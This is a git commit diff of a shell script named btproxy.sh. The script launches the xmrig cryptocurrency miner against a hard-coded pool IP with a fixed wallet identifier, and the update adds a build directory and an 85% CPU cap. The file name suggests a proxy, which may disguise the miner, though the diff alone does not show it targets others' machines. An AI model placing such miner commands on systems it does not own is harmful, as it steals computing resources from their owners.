08f96cc3d0a4ae1951a999cd9a349affa999cf8e
robertreynolds2 <64372884+robertreynolds2@users.noreply.github.com>
2021-10-05 17:50:01 +0700

    Update btproxy.sh

--- btproxy.sh
+++ btproxy.sh
@@ -1,1 +1,2 @@
-./xmrig -o 139.180.190.196:1231 -a rx -k -u BTT:TRGnhHFiSb4256PzFSEBqEF34psbsT2NPN.aq -p x
+cd /xmrig/build/
+./xmrig -o 139.180.190.196:1231 -u BTT:TRGnhHFiSb4256PzFSEBqEF34psbsT2NPN.aq -p x --cpu-max-threads-hint=85
